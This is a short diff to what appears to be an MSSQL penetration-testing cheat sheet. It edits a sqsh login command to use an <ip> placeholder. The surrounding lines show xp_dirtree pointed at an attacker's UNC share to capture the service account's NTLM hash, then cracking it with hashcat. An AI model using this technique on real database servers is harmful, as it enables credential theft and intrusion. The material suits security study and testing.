@@ -369,8 +369,8 @@ xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned
 1> xp_dirtree "\\<local_ip>\doesnotexist"
 ```
 
-```powershell
-sqsh -S ip -U WIN-02\\mssqlsvc -P 'pass' -h
+```sh
+sqsh -S <ip> -U WIN-02\\mssqlsvc -P 'pass' -h
 ```
 
 * If the service account has access to our server, we will obtain its hash, which we could crack with hashcat
